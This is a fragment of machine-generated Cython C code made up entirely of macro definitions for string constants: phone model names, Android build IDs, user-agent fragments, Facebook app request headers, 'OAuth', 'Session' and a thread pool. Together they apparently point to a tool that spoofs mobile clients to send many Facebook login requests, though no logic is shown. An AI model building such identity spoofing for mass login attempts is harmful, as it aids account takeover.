#define __pyx_kp_s_Moto_X_2nd_Gen_AT_T __pyx_mstate_global->__pyx_kp_s_Moto_X_2nd_Gen_AT_T
#define __pyx_kp_s_Moto_Z __pyx_mstate_global->__pyx_kp_s_Moto_Z
#define __pyx_kp_u_Mozilla_5_0_Linux_Android __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Linux_Android
#define __pyx_kp_u_Mozilla_5_0_Linux_U_Android_10_e __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Linux_U_Android_10_e
#define __pyx_kp_u_Mozilla_5_0_Linux_U_Android_13_p __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Linux_U_Android_13_p
#define __pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android
#define __pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac
#define __pyx_kp_u_Mozilla_5_0_Windows_NT __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Windows_NT
#define __pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6 __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6
#define __pyx_kp_u_Mozilla_5_0_Windows_NT_6 __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Windows_NT_6
#define __pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT
#define __pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And __pyx_mstate_global->__pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And
#define __pyx_kp_s_MultiPhone_3350_Duo __pyx_mstate_global->__pyx_kp_s_MultiPhone_3350_Duo
#define __pyx_kp_s_MultiPhone_4044_Duo __pyx_mstate_global->__pyx_kp_s_MultiPhone_4044_Duo
#define __pyx_kp_s_MultiPhone_5504_DUO __pyx_mstate_global->__pyx_kp_s_MultiPhone_5504_DUO
#define __pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G __pyx_mstate_global->__pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G
#define __pyx_kp_s_Multiphone_7600_Duo __pyx_mstate_global->__pyx_kp_s_Multiphone_7600_Duo
#define __pyx_n_s_N4F26J __pyx_mstate_global->__pyx_n_s_N4F26J
#define __pyx_n_s_N4F26X __pyx_mstate_global->__pyx_n_s_N4F26X
#define __pyx_n_s_N970FXXS8ETK4 __pyx_mstate_global->__pyx_n_s_N970FXXS8ETK4
#define __pyx_n_s_N986BXXU1BTJ4 __pyx_mstate_global->__pyx_n_s_N986BXXU1BTJ4
#define __pyx_n_s_N9F27L __pyx_mstate_global->__pyx_n_s_N9F27L
#define __pyx_n_s_ND __pyx_mstate_global->__pyx_n_s_ND
#define __pyx_n_s_NDE63H __pyx_mstate_global->__pyx_n_s_NDE63H
#define __pyx_n_s_NMF2 __pyx_mstate_global->__pyx_n_s_NMF2
#define __pyx_n_s_NMF26X __pyx_mstate_global->__pyx_n_s_NMF26X
#define __pyx_kp_s_NMF26X_2 __pyx_mstate_global->__pyx_kp_s_NMF26X_2
#define __pyx_n_s_NMF27D __pyx_mstate_global->__pyx_n_s_NMF27D
#define __pyx_n_s_NRD90M __pyx_mstate_global->__pyx_n_s_NRD90M
#define __pyx_kp_s_NRD90M_2 __pyx_mstate_global->__pyx_kp_s_NRD90M_2
#define __pyx_n_s_Name __pyx_mstate_global->__pyx_n_s_Name
#define __pyx_n_u_NokiaX __pyx_mstate_global->__pyx_n_u_NokiaX
#define __pyx_kp_s_Not_A_Brand_v_8_0_0_0_Chromium __pyx_mstate_global->__pyx_kp_s_Not_A_Brand_v_8_0_0_0_Chromium
#define __pyx_kp_s_Not_A_Brand_v_8_Chromium_v_120 __pyx_mstate_global->__pyx_kp_s_Not_A_Brand_v_8_Chromium_v_120
#define __pyx_kp_s_Note_12_Pro __pyx_mstate_global->__pyx_kp_s_Note_12_Pro
#define __pyx_n_s_November __pyx_mstate_global->__pyx_n_s_November
#define __pyx_kp_u_OAuth __pyx_mstate_global->__pyx_kp_u_OAuth
#define __pyx_kp_s_OPM2_171026_006_C1 __pyx_mstate_global->__pyx_kp_s_OPM2_171026_006_C1
#define __pyx_kp_s_OPM6_171019_030_K1 __pyx_mstate_global->__pyx_kp_s_OPM6_171019_030_K1
#define __pyx_kp_s_OT_7025D __pyx_mstate_global->__pyx_kp_s_OT_7025D
#define __pyx_n_s_OUT __pyx_mstate_global->__pyx_n_s_OUT
#define __pyx_n_s_October __pyx_mstate_global->__pyx_n_s_October
#define __pyx_kp_s_Optimus_Vu __pyx_mstate_global->__pyx_kp_s_Optimus_Vu
#define __pyx_kp_s_P10_Lite_LTE __pyx_mstate_global->__pyx_kp_s_P10_Lite_LTE
#define __pyx_n_s_P2 __pyx_mstate_global->__pyx_n_s_P2
#define __pyx_kp_s_P20_Lite __pyx_mstate_global->__pyx_kp_s_P20_Lite
#define __pyx_kp_s_P30_Pro_Global __pyx_mstate_global->__pyx_kp_s_P30_Pro_Global
#define __pyx_n_s_P3400 __pyx_mstate_global->__pyx_n_s_P3400
#define __pyx_kp_s_P55_Max __pyx_mstate_global->__pyx_kp_s_P55_Max
#define __pyx_kp_s_P7_Max __pyx_mstate_global->__pyx_kp_s_P7_Max
#define __pyx_kp_s_P8_Lite __pyx_mstate_global->__pyx_kp_s_P8_Lite
#define __pyx_kp_s_P9_Lite __pyx_mstate_global->__pyx_kp_s_P9_Lite
#define __pyx_n_s_PM __pyx_mstate_global->__pyx_n_s_PM
#define __pyx_kp_s_PPR1_180610_011 __pyx_mstate_global->__pyx_kp_s_PPR1_180610_011
#define __pyx_kp_s_PPR2_180905_006 __pyx_mstate_global->__pyx_kp_s_PPR2_180905_006
#define __pyx_kp_s_PQ1A_181205_002_A1 __pyx_mstate_global->__pyx_kp_s_PQ1A_181205_002_A1
#define __pyx_kp_s_PQ1A_181205_006 __pyx_mstate_global->__pyx_kp_s_PQ1A_181205_006
#define __pyx_kp_s_PQ3B_190801_002 __pyx_mstate_global->__pyx_kp_s_PQ3B_190801_002
#define __pyx_kp_s_Pacific_800i __pyx_mstate_global->__pyx_kp_s_Pacific_800i
#define __pyx_kp_s_Pad_6_Pro __pyx_mstate_global->__pyx_kp_s_Pad_6_Pro
#define __pyx_kp_s_Pearl_8100 __pyx_mstate_global->__pyx_kp_s_Pearl_8100
#define __pyx_kp_s_Phoenix_2 __pyx_mstate_global->__pyx_kp_s_Phoenix_2
#define __pyx_n_s_Phone __pyx_mstate_global->__pyx_n_s_Phone
#define __pyx_n_s_PhotosAYYUB __pyx_mstate_global->__pyx_n_s_PhotosAYYUB
#define __pyx_n_s_Pixel __pyx_mstate_global->__pyx_n_s_Pixel
#define __pyx_kp_s_Pixel_3 __pyx_mstate_global->__pyx_kp_s_Pixel_3
#define __pyx_kp_s_Pixel_XL __pyx_mstate_global->__pyx_kp_s_Pixel_XL
#define __pyx_n_s_Pixi __pyx_mstate_global->__pyx_n_s_Pixi
#define __pyx_kp_s_Please_Confirm_Email __pyx_mstate_global->__pyx_kp_s_Please_Confirm_Email
#define __pyx_kp_s_Pocophone_F1 __pyx_mstate_global->__pyx_kp_s_Pocophone_F1
#define __pyx_kp_s_Prada_3_0 __pyx_mstate_global->__pyx_kp_s_Prada_3_0
#define __pyx_n_s_Pre3 __pyx_mstate_global->__pyx_n_s_Pre3
#define __pyx_kp_s_Primo_GH7 __pyx_mstate_global->__pyx_kp_s_Primo_GH7
#define __pyx_kp_u_Profile_MIDP_2_1_Configuration_C __pyx_mstate_global->__pyx_kp_u_Profile_MIDP_2_1_Configuration_C
#define __pyx_kp_s_QKQ1_190910_002 __pyx_mstate_global->__pyx_kp_s_QKQ1_190910_002
#define __pyx_kp_s_QP1A_191105_003 __pyx_mstate_global->__pyx_kp_s_QP1A_191105_003
#define __pyx_kp_s_Qin_1s __pyx_mstate_global->__pyx_kp_s_Qin_1s
#define __pyx_kp_s_Qin_2 __pyx_mstate_global->__pyx_kp_s_Qin_2
#define __pyx_kp_s_Qin_2_Pro __pyx_mstate_global->__pyx_kp_s_Qin_2_Pro
#define __pyx_kp_s_Quad_EVO_Energy_5 __pyx_mstate_global->__pyx_kp_s_Quad_EVO_Energy_5
#define __pyx_kp_s_Quantum_4 __pyx_mstate_global->__pyx_kp_s_Quantum_4
#define __pyx_n_s_R __pyx_mstate_global->__pyx_n_s_R
#define __pyx_kp_s_RD1A_201105_003_C1 __pyx_mstate_global->__pyx_kp_s_RD1A_201105_003_C1
#define __pyx_n_s_RMX2085 __pyx_mstate_global->__pyx_n_s_RMX2085
#define __pyx_n_s_RMX2185 __pyx_mstate_global->__pyx_n_s_RMX2185
#define __pyx_kp_s_RM_560 __pyx_mstate_global->__pyx_kp_s_RM_560
#define __pyx_kp_s_RP1A_201005_004_A1 __pyx_mstate_global->__pyx_kp_s_RP1A_201005_004_A1
#define __pyx_kp_s_Radar_4G __pyx_mstate_global->__pyx_kp_s_Radar_4G
#define __pyx_kp_s_Radar_C110e __pyx_mstate_global->__pyx_kp_s_Radar_C110e
#define __pyx_n_s_Random __pyx_mstate_global->__pyx_n_s_Random
#define __pyx_n_s_Realme __pyx_mstate_global->__pyx_n_s_Realme
#define __pyx_kp_s_Realme_2 __pyx_mstate_global->__pyx_kp_s_Realme_2
#define __pyx_kp_s_Red_Rice __pyx_mstate_global->__pyx_kp_s_Red_Rice
#define __pyx_kp_u_Redmi __pyx_mstate_global->__pyx_kp_u_Redmi
#define __pyx_kp_s_Redmi_11 __pyx_mstate_global->__pyx_kp_s_Redmi_11
#define __pyx_kp_s_Redmi_12 __pyx_mstate_global->__pyx_kp_s_Redmi_12
#define __pyx_kp_s_Redmi_2 __pyx_mstate_global->__pyx_kp_s_Redmi_2
#define __pyx_kp_s_Redmi_3 __pyx_mstate_global->__pyx_kp_s_Redmi_3
#define __pyx_kp_s_Redmi_3S __pyx_mstate_global->__pyx_kp_s_Redmi_3S
#define __pyx_kp_s_Redmi_4 __pyx_mstate_global->__pyx_kp_s_Redmi_4
#define __pyx_kp_s_Redmi_4A __pyx_mstate_global->__pyx_kp_s_Redmi_4A
#define __pyx_kp_s_Redmi_4X __pyx_mstate_global->__pyx_kp_s_Redmi_4X
#define __pyx_kp_s_Redmi_5 __pyx_mstate_global->__pyx_kp_s_Redmi_5
#define __pyx_kp_s_Redmi_5A __pyx_mstate_global->__pyx_kp_s_Redmi_5A
#define __pyx_kp_s_Redmi_5_Plus __pyx_mstate_global->__pyx_kp_s_Redmi_5_Plus
#define __pyx_kp_s_Redmi_6 __pyx_mstate_global->__pyx_kp_s_Redmi_6
#define __pyx_kp_s_Redmi_7 __pyx_mstate_global->__pyx_kp_s_Redmi_7
#define __pyx_kp_s_Redmi_8 __pyx_mstate_global->__pyx_kp_s_Redmi_8
#define __pyx_kp_s_Redmi_9 __pyx_mstate_global->__pyx_kp_s_Redmi_9
#define __pyx_kp_s_Redmi_A1 __pyx_mstate_global->__pyx_kp_s_Redmi_A1
#define __pyx_kp_s_Redmi_A2 __pyx_mstate_global->__pyx_kp_s_Redmi_A2
#define __pyx_kp_s_Redmi_A3 __pyx_mstate_global->__pyx_kp_s_Redmi_A3
#define __pyx_kp_s_Redmi_K30 __pyx_mstate_global->__pyx_kp_s_Redmi_K30
#define __pyx_kp_s_Redmi_K40 __pyx_mstate_global->__pyx_kp_s_Redmi_K40
#define __pyx_kp_s_Redmi_K50 __pyx_mstate_global->__pyx_kp_s_Redmi_K50
#define __pyx_kp_s_Redmi_K60 __pyx_mstate_global->__pyx_kp_s_Redmi_K60
#define __pyx_kp_s_Redmi_Note __pyx_mstate_global->__pyx_kp_s_Redmi_Note
#define __pyx_kp_s_Redmi_Note10 __pyx_mstate_global->__pyx_kp_s_Redmi_Note10
#define __pyx_kp_s_Redmi_Note10T __pyx_mstate_global->__pyx_kp_s_Redmi_Note10T
#define __pyx_kp_s_Redmi_Note7 __pyx_mstate_global->__pyx_kp_s_Redmi_Note7
#define __pyx_kp_s_Redmi_Note8 __pyx_mstate_global->__pyx_kp_s_Redmi_Note8
#define __pyx_kp_s_Redmi_Note8T __pyx_mstate_global->__pyx_kp_s_Redmi_Note8T
#define __pyx_kp_s_Redmi_Note9 __pyx_mstate_global->__pyx_kp_s_Redmi_Note9
#define __pyx_kp_s_Redmi_Note_1 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_1
#define __pyx_kp_s_Redmi_Note_10Redmi_Note_11 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_10Redmi_Note_11
#define __pyx_kp_s_Redmi_Note_12 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_12
#define __pyx_kp_s_Redmi_Note_12T __pyx_mstate_global->__pyx_kp_s_Redmi_Note_12T
#define __pyx_kp_s_Redmi_Note_13 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_13
#define __pyx_kp_s_Redmi_Note_15_Pro __pyx_mstate_global->__pyx_kp_s_Redmi_Note_15_Pro
#define __pyx_kp_s_Redmi_Note_2 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_2
#define __pyx_kp_s_Redmi_Note_3 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_3
#define __pyx_kp_s_Redmi_Note_4 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_4
#define __pyx_kp_s_Redmi_Note_4X __pyx_mstate_global->__pyx_kp_s_Redmi_Note_4X
#define __pyx_kp_s_Redmi_Note_5 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_5
#define __pyx_kp_s_Redmi_Note_5A __pyx_mstate_global->__pyx_kp_s_Redmi_Note_5A
#define __pyx_kp_s_Redmi_Note_5A_Prime __pyx_mstate_global->__pyx_kp_s_Redmi_Note_5A_Prime
#define __pyx_kp_s_Redmi_Note_5_Pro __pyx_mstate_global->__pyx_kp_s_Redmi_Note_5_Pro
#define __pyx_kp_s_Redmi_Note_6 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_6
#define __pyx_kp_s_Redmi_Note_7 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_7
#define __pyx_kp_s_Redmi_Note_7_Pro __pyx_mstate_global->__pyx_kp_s_Redmi_Note_7_Pro
#define __pyx_kp_s_Redmi_Note_8T __pyx_mstate_global->__pyx_kp_s_Redmi_Note_8T
#define __pyx_kp_s_Redmi_Note_8_Pro __pyx_mstate_global->__pyx_kp_s_Redmi_Note_8_Pro
#define __pyx_kp_s_Redmi_Note_9 __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9
#define __pyx_kp_s_Redmi_Note_9S __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9S
#define __pyx_kp_s_Redmi_Note_9T __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9T
#define __pyx_kp_s_Redmi_Note_9T_5G __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9T_5G
#define __pyx_kp_s_Redmi_Note_9_5G __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9_5G
#define __pyx_kp_s_Redmi_Note_9_Pro __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9_Pro
#define __pyx_kp_s_Redmi_Note_9_Pro_5G __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9_Pro_5G
#define __pyx_kp_s_Redmi_Note_9_Pro_Max __pyx_mstate_global->__pyx_kp_s_Redmi_Note_9_Pro_Max
#define __pyx_kp_s_Redmi_Note_Prime __pyx_mstate_global->__pyx_kp_s_Redmi_Note_Prime
#define __pyx_kp_s_Redmi_Pad __pyx_mstate_global->__pyx_kp_s_Redmi_Pad
#define __pyx_kp_s_Redmi_Pro __pyx_mstate_global->__pyx_kp_s_Redmi_Pro
#define __pyx_kp_s_Redmi_S2 __pyx_mstate_global->__pyx_kp_s_Redmi_S2
#define __pyx_kp_s_Redmi_X __pyx_mstate_global->__pyx_kp_s_Redmi_X
#define __pyx_kp_s_Redmi_Y1 __pyx_mstate_global->__pyx_kp_s_Redmi_Y1
#define __pyx_kp_s_Redmi_Y1_Lite __pyx_mstate_global->__pyx_kp_s_Redmi_Y1_Lite
#define __pyx_kp_s_Redmi_Y2 __pyx_mstate_global->__pyx_kp_s_Redmi_Y2
#define __pyx_kp_s_Redmi_Y3 __pyx_mstate_global->__pyx_kp_s_Redmi_Y3
#define __pyx_kp_s_Redmi_note __pyx_mstate_global->__pyx_kp_s_Redmi_note
#define __pyx_kp_s_Rex_60 __pyx_mstate_global->__pyx_kp_s_Rex_60
#define __pyx_kp_s_Rex_80 __pyx_mstate_global->__pyx_kp_s_Rex_80
#define __pyx_n_s_Rhyme __pyx_mstate_global->__pyx_n_s_Rhyme
#define __pyx_n_s_Ruby __pyx_mstate_global->__pyx_n_s_Ruby
#define __pyx_n_s_S __pyx_mstate_global->__pyx_n_s_S
#define __pyx_n_s_S4502M __pyx_mstate_global->__pyx_n_s_S4502M
#define __pyx_n_s_S4505M __pyx_mstate_global->__pyx_n_s_S4505M
#define __pyx_n_s_S4702M __pyx_mstate_global->__pyx_n_s_S4702M
#define __pyx_n_s_S580 __pyx_mstate_global->__pyx_n_s_S580
#define __pyx_n_s_S616 __pyx_mstate_global->__pyx_n_s_S616
#define __pyx_n_s_S660 __pyx_mstate_global->__pyx_n_s_S660
#define __pyx_kp_s_SA_str_rr_1_9_Mobile_Safari_str __pyx_mstate_global->__pyx_kp_s_SA_str_rr_1_9_Mobile_Safari_str
#define __pyx_kp_s_SD1A_210817_037_A1 __pyx_mstate_global->__pyx_kp_s_SD1A_210817_037_A1
#define __pyx_kp_s_SGH_E250 __pyx_mstate_global->__pyx_kp_s_SGH_E250
#define __pyx_kp_s_SGH_I547 __pyx_mstate_global->__pyx_kp_s_SGH_I547
#define __pyx_kp_s_SM_A500F __pyx_mstate_global->__pyx_kp_s_SM_A500F
#define __pyx_kp_s_SM_A500FU __pyx_mstate_global->__pyx_kp_s_SM_A500FU
#define __pyx_kp_s_SM_A500H __pyx_mstate_global->__pyx_kp_s_SM_A500H
#define __pyx_kp_s_SM_G485F __pyx_mstate_global->__pyx_kp_s_SM_G485F
#define __pyx_kp_s_SM_G900F __pyx_mstate_global->__pyx_kp_s_SM_G900F
#define __pyx_kp_s_SM_G920F __pyx_mstate_global->__pyx_kp_s_SM_G920F
#define __pyx_kp_s_SM_G930F __pyx_mstate_global->__pyx_kp_s_SM_G930F
#define __pyx_kp_s_SM_G935F __pyx_mstate_global->__pyx_kp_s_SM_G935F
#define __pyx_kp_s_SM_G950F __pyx_mstate_global->__pyx_kp_s_SM_G950F
#define __pyx_kp_s_SM_J320F __pyx_mstate_global->__pyx_kp_s_SM_J320F
#define __pyx_kp_s_SM_J320FN __pyx_mstate_global->__pyx_kp_s_SM_J320FN
#define __pyx_kp_s_SM_J320H __pyx_mstate_global->__pyx_kp_s_SM_J320H
#define __pyx_kp_s_SM_J320M __pyx_mstate_global->__pyx_kp_s_SM_J320M
#define __pyx_kp_s_SM_J510FN __pyx_mstate_global->__pyx_kp_s_SM_J510FN
#define __pyx_kp_s_SM_J701F __pyx_mstate_global->__pyx_kp_s_SM_J701F
#define __pyx_kp_s_SM_T111 __pyx_mstate_global->__pyx_kp_s_SM_T111
#define __pyx_kp_s_SM_T230 __pyx_mstate_global->__pyx_kp_s_SM_T230
#define __pyx_kp_s_SM_T231 __pyx_mstate_global->__pyx_kp_s_SM_T231
#define __pyx_kp_s_SM_T235 __pyx_mstate_global->__pyx_kp_s_SM_T235
#define __pyx_kp_s_SM_T310 __pyx_mstate_global->__pyx_kp_s_SM_T310
#define __pyx_kp_s_SM_T311 __pyx_mstate_global->__pyx_kp_s_SM_T311
#define __pyx_kp_s_SM_T315 __pyx_mstate_global->__pyx_kp_s_SM_T315
#define __pyx_kp_s_SM_T525 __pyx_mstate_global->__pyx_kp_s_SM_T525
#define __pyx_kp_s_SM_T531 __pyx_mstate_global->__pyx_kp_s_SM_T531
#define __pyx_kp_s_SM_T535 __pyx_mstate_global->__pyx_kp_s_SM_T535
#define __pyx_kp_s_SM_T555 __pyx_mstate_global->__pyx_kp_s_SM_T555
#define __pyx_kp_s_SM_T561 __pyx_mstate_global->__pyx_kp_s_SM_T561
#define __pyx_kp_s_SM_T705 __pyx_mstate_global->__pyx_kp_s_SM_T705
#define __pyx_kp_s_SM_T805 __pyx_mstate_global->__pyx_kp_s_SM_T805
#define __pyx_kp_s_SM_T820 __pyx_mstate_global->__pyx_kp_s_SM_T820
#define __pyx_kp_s_SPH_L720 __pyx_mstate_global->__pyx_kp_s_SPH_L720
#define __pyx_kp_s_SQ1A_211205_008 __pyx_mstate_global->__pyx_kp_s_SQ1A_211205_008
#define __pyx_kp_u_Safari __pyx_mstate_global->__pyx_kp_u_Safari
#define __pyx_kp_u_Safari_537_36_Edg __pyx_mstate_global->__pyx_kp_u_Safari_537_36_Edg
#define __pyx_n_s_Sensation __pyx_mstate_global->__pyx_n_s_Sensation
#define __pyx_n_s_September __pyx_mstate_global->__pyx_n_s_September
#define __pyx_n_s_Session __pyx_mstate_global->__pyx_n_s_Session
#define __pyx_n_s_Spark __pyx_mstate_global->__pyx_n_s_Spark
#define __pyx_kp_s_Star_3_Duos __pyx_mstate_global->__pyx_kp_s_Star_3_Duos
#define __pyx_kp_s_Storm_9530 __pyx_mstate_global->__pyx_kp_s_Storm_9530
#define __pyx_n_s_Stream __pyx_mstate_global->__pyx_n_s_Stream
#define __pyx_kp_s_Stylo_2_Plus_T_Mobile __pyx_mstate_global->__pyx_kp_s_Stylo_2_Plus_T_Mobile
#define __pyx_kp_s_Stylus_2 __pyx_mstate_global->__pyx_kp_s_Stylus_2
#define __pyx_n_s_T500XXU3BUA8 __pyx_mstate_global->__pyx_n_s_T500XXU3BUA8
#define __pyx_n_s_T970XXU3BUI7 __pyx_mstate_global->__pyx_n_s_T970XXU3BUI7
#define __pyx_kp_s_TM_4377 __pyx_mstate_global->__pyx_kp_s_TM_4377
#define __pyx_kp_s_TQ1A_230105_001_A3 __pyx_mstate_global->__pyx_kp_s_TQ1A_230105_001_A3
#define __pyx_n_s_ThreadPoolExecutor __pyx_mstate_global->__pyx_n_s_ThreadPoolExecutor
#define __pyx_kp_s_Torch_4G_9810 __pyx_mstate_global->__pyx_kp_s_Torch_4G_9810
#define __pyx_kp_s_User_Agent __pyx_mstate_global->__pyx_kp_s_User_Agent
#define __pyx_kp_s_V10_AT_T __pyx_mstate_global->__pyx_kp_s_V10_AT_T
#define __pyx_kp_s_V10_T_Mobile __pyx_mstate_global->__pyx_kp_s_V10_T_Mobile
#define __pyx_kp_s_V10_Verizon __pyx_mstate_global->__pyx_kp_s_V10_Verizon
#define __pyx_n_s_V1Max __pyx_mstate_global->__pyx_n_s_V1Max
#define __pyx_n_s_V20 __pyx_mstate_global->__pyx_n_s_V20
#define __pyx_kp_s_V20_AT_T __pyx_mstate_global->__pyx_kp_s_V20_AT_T
#define __pyx_kp_s_V20_Sprint __pyx_mstate_global->__pyx_kp_s_V20_Sprint
#define __pyx_kp_s_V20_T_Mobile __pyx_mstate_global->__pyx_kp_s_V20_T_Mobile
#define __pyx_kp_s_V20_Verizon __pyx_mstate_global->__pyx_kp_s_V20_Verizon
#define __pyx_n_s_V3 __pyx_mstate_global->__pyx_n_s_V3
#define __pyx_n_s_V5 __pyx_mstate_global->__pyx_n_s_V5
#define __pyx_n_s_V5s __pyx_mstate_global->__pyx_n_s_V5s
#define __pyx_n_s_V7 __pyx_mstate_global->__pyx_n_s_V7
#define __pyx_kp_s_V7_Plus __pyx_mstate_global->__pyx_kp_s_V7_Plus
#define __pyx_n_s_V808 __pyx_mstate_global->__pyx_n_s_V808
#define __pyx_n_s_V9 __pyx_mstate_global->__pyx_n_s_V9
#define __pyx_kp_s_VR_Bot_552 __pyx_mstate_global->__pyx_kp_s_VR_Bot_552
#define __pyx_n_s_VX5500 __pyx_mstate_global->__pyx_n_s_VX5500
#define __pyx_n_s_Valencia __pyx_mstate_global->__pyx_n_s_Valencia
#define __pyx_n_s_ValueError __pyx_mstate_global->__pyx_n_s_ValueError
#define __pyx_kp_s_Vdeo_2 __pyx_mstate_global->__pyx_kp_s_Vdeo_2
#define __pyx_kp_s_Vega_Iron_2_WiFi __pyx_mstate_global->__pyx_kp_s_Vega_Iron_2_WiFi
#define __pyx_kp_s_Vibe_K5 __pyx_mstate_global->__pyx_kp_s_Vibe_K5
#define __pyx_kp_s_Vibe_K5_Note __pyx_mstate_global->__pyx_kp_s_Vibe_K5_Note
#define __pyx_kp_s_Vibe_K5_Plus_Dual_SIM __pyx_mstate_global->__pyx_kp_s_Vibe_K5_Plus_Dual_SIM
#define __pyx_kp_s_Vibe_X __pyx_mstate_global->__pyx_kp_s_Vibe_X
#define __pyx_kp_s_Vibe_Z __pyx_mstate_global->__pyx_kp_s_Vibe_Z
#define __pyx_n_s_Vision __pyx_mstate_global->__pyx_n_s_Vision
#define __pyx_kp_s_Vision_3_Dual_SIM __pyx_mstate_global->__pyx_kp_s_Vision_3_Dual_SIM
#define __pyx_kp_s_Volt_LS740 __pyx_mstate_global->__pyx_kp_s_Volt_LS740
#define __pyx_kp_u_WOW64_AppleWebKit __pyx_mstate_global->__pyx_kp_u_WOW64_AppleWebKit
#define __pyx_n_s_X __pyx_mstate_global->__pyx_n_s_X
#define __pyx_n_s_X1 __pyx_mstate_global->__pyx_n_s_X1
#define __pyx_n_s_X2 __pyx_mstate_global->__pyx_n_s_X2
#define __pyx_n_s_X3 __pyx_mstate_global->__pyx_n_s_X3
#define __pyx_n_s_X4 __pyx_mstate_global->__pyx_n_s_X4
#define __pyx_n_s_X5 __pyx_mstate_global->__pyx_n_s_X5
#define __pyx_kp_s_XD __pyx_mstate_global->__pyx_kp_s_XD
#define __pyx_kp_s_XD_2 __pyx_mstate_global->__pyx_kp_s_XD_2
#define __pyx_kp_u_XD_3 __pyx_mstate_global->__pyx_kp_u_XD_3
#define __pyx_kp_s_X_FB_Connection_Bandwidth __pyx_mstate_global->__pyx_kp_s_X_FB_Connection_Bandwidth
#define __pyx_kp_s_X_FB_Connection_Type __pyx_mstate_global->__pyx_kp_s_X_FB_Connection_Type
#define __pyx_kp_s_X_FB_Friendly_Name __pyx_mstate_global->__pyx_kp_s_X_FB_Friendly_Name
#define __pyx_kp_s_X_FB_HTTP_Engine __pyx_mstate_global->__pyx_kp_s_X_FB_HTTP_Engine
#define __pyx_kp_s_X_FB_Net_HNI __pyx_mstate_global->__pyx_kp_s_X_FB_Net_HNI
#define __pyx_kp_s_X_FB_SIM_HNI __pyx_mstate_global->__pyx_kp_s_X_FB_SIM_HNI
#define __pyx_n_s_Y __pyx_mstate_global->__pyx_n_s_Y
#define __pyx_n_s_Y21 __pyx_mstate_global->__pyx_n_s_Y21
#define __pyx_n_s_Y21L __pyx_mstate_global->__pyx_n_s_Y21L
#define __pyx_n_s_Y28 __pyx_mstate_global->__pyx_n_s_Y28
#define __pyx_kp_s_Y336_U02 __pyx_mstate_global->__pyx_kp_s_Y336_U02
#define __pyx_kp_s_Y3_2018 __pyx_mstate_global->__pyx_kp_s_Y3_2018
#define __pyx_n_s_Y51 __pyx_mstate_global->__pyx_n_s_Y51
#define __pyx_n_s_Y51L __pyx_mstate_global->__pyx_n_s_Y51L
#define __pyx_n_s_Y55L __pyx_mstate_global->__pyx_n_s_Y55L
#define __pyx_kp_s_Y5_Dual_SIM_2017 __pyx_mstate_global->__pyx_kp_s_Y5_Dual_SIM_2017
#define __pyx_kp_s_Y5_II __pyx_mstate_global->__pyx_kp_s_Y5_II
#define __pyx_kp_s_Y5_Prime_2018_Dual_SIM __pyx_mstate_global->__pyx_kp_s_Y5_Prime_2018_Dual_SIM
#define __pyx_n_s_Y65 __pyx_mstate_global->__pyx_n_s_Y65
#define __pyx_n_s_Y66 __pyx_mstate_global->__pyx_n_s_Y66
#define __pyx_n_s_Y69 __pyx_mstate_global->__pyx_n_s_Y69
#define __pyx_kp_s_Y6_2018 __pyx_mstate_global->__pyx_kp_s_Y6_2018
#define __pyx_kp_s_Y6_Dual_SIM_2018 __pyx_mstate_global->__pyx_kp_s_Y6_Dual_SIM_2018
#define __pyx_kp_s_Y6_Prime_2018 __pyx_mstate_global->__pyx_kp_s_Y6_Prime_2018
#define __pyx_n_s_Y71 __pyx_mstate_global->__pyx_n_s_Y71
#define __pyx_n_s_Y81 __pyx_mstate_global->__pyx_n_s_Y81
#define __pyx_n_s_Y83 __pyx_mstate_global->__pyx_n_s_Y83
#define __pyx_kp_s_YP_GI1 __pyx_mstate_global->__pyx_kp_s_YP_GI1
#define __pyx_kp_u_YaApp_Android __pyx_mstate_global->__pyx_kp_u_YaApp_Android
#define __pyx_kp_s_YaBrowser __pyx_mstate_global->__pyx_kp_s_YaBrowser
#define __pyx_n_s_Yes __pyx_mstate_global->__pyx_n_s_Yes
#define __pyx_kp_s_Yota_Phone_2 __pyx_mstate_global->__pyx_kp_s_Yota_Phone_2
#define __pyx_n_s_Zong __pyx_mstate_global->__pyx_n_s_Zong
#define __pyx_kp_s__11 __pyx_mstate_global->__pyx_kp_s__11
#define __pyx_kp_u__11 __pyx_mstate_global->__pyx_kp_u__11
#define __pyx_kp_s__119 __pyx_mstate_global->__pyx_kp_s__119
#define __pyx_kp_s__124 __pyx_mstate_global->__pyx_kp_s__124
#define __pyx_n_s__160 __pyx_mstate_global->__pyx_n_s__160
#define __pyx_kp_s__25 __pyx_mstate_global->__pyx_kp_s__25
#define __pyx_kp_u__25 __pyx_mstate_global->__pyx_kp_u__25
#define __pyx_kp_s__32 __pyx_mstate_global->__pyx_kp_s__32
#define __pyx_kp_s__33 __pyx_mstate_global->__pyx_kp_s__33
